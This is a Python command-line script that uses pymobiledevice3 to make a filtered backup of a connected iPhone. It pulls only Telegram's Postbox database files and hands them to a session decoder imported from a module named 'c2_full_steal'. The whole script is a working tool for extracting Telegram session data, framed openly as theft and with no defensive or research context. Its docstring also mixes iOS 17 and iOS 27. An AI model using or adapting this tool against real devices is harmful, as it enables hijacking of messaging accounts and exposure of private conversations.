#!/usr/bin/env python3
"""iOS 17 stock Telegram session C2 via partial MobileBackup2 + decode.

The stock App Store app's data container is not reachable through
house_arrest/CoreDevice on iOS 27.  The stock app's App Group, however, is
included in the MobileBackup2 backup.  This CLI performs a **filtered**
backup of just the Postbox database (and its WAL/SHM), unpacks it, locates
`AppDomainGroup-group.ph.telegra.Telegraph/telegram-data/account-*/postbox/db/db_sqlite`,
and decodes the session with the same decoder used by the 6s/17 CLIs.

Usage:
  python3 c2_ios17_stock.py                 # filtered backup + decode
  python3 c2_ios17_stock.py --existing DIR  # reuse an existing backup dir
  python3 c2_ios17_stock.py --decode-only DB
"""
from __future__ import annotations

import argparse
import os
import shutil
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.normpath(os.path.join(HERE, "..", ".."))
PMD = os.path.join(ROOT, "ios_sideload", "venv", "bin", "pymobiledevice3")
BACKUP = "/tmp/opencode/ios17_stock_backup"
OUT = "/tmp/opencode/ios17_stock_db"
CHAT = 0  # <ACCOUNT_NAME>
GROUP_DOMAIN = "AppDomainGroup-group.ph.telegra.Telegraph"


def run(args: list[str], timeout: int | None = None) -> subprocess.CompletedProcess:
    print("[*] " + " ".join(args[1:3] + args[3:]), flush=True)
    return subprocess.run(args, check=True, timeout=timeout,
                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                          text=True)


def do_backup(dst: str) -> None:
    if os.path.isdir(dst):
        shutil.rmtree(dst)
    run([PMD, "backup2", "backup", dst, "--full",
         "--only-regex", "postbox/db/db_sqlite",
         "--only-regex", "postbox/db/db_sqlite-wal",
         "--only-regex", "postbox/db/db_sqlite-shm"])


def do_unback(src: str) -> None:
    # `unback` writes the original hierarchy; it rejects an existing target,
    # so use a fresh sibling directory when needed.
    run([PMD, "backup2", "unback", src])


def find_stock_db(root: str) -> str | None:
    for base, _dirs, files in os.walk(root):
        if not base.endswith("/postbox/db"):
            continue
        if "db_sqlite" not in files:
            continue
        if GROUP_DOMAIN not in base:
            continue
        return os.path.join(base, "db_sqlite")
    return None


def main() -> int:
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--backup-dir", default=BACKUP)
    ap.add_argument("--existing", default=None,
                    help="reuse an already completed backup directory")
    ap.add_argument("--decode-only", default=None)
    ap.add_argument("--out", default=OUT)
    ap.add_argument("--chat", type=int, default=CHAT)
    args = ap.parse_args()

    if args.decode_only:
        target = args.decode_only
    else:
        src = args.existing or args.backup_dir
        if not args.existing:
            do_backup(src)
        do_unback(src)
        db = find_stock_db(src)
        if not db:
            print("[!] stock Postbox DB not found under %s" % src)
            return 1
        print("[*] stock DB: %s" % db)
        # Copy the DB and its WAL/SHM to a stable basename for the decoder.
        os.makedirs(os.path.dirname(args.out), exist_ok=True)
        for suffix in ("", "-wal", "-shm"):
            s = db + suffix
            if os.path.exists(s):
                shutil.copy2(s, args.out + suffix)
        target = args.out

    sys.path.insert(0, HERE)
    from c2_full_steal import decode_db
    decode_db(target, args.chat)
    return 0


if __name__ == "__main__":
    sys.exit(main())
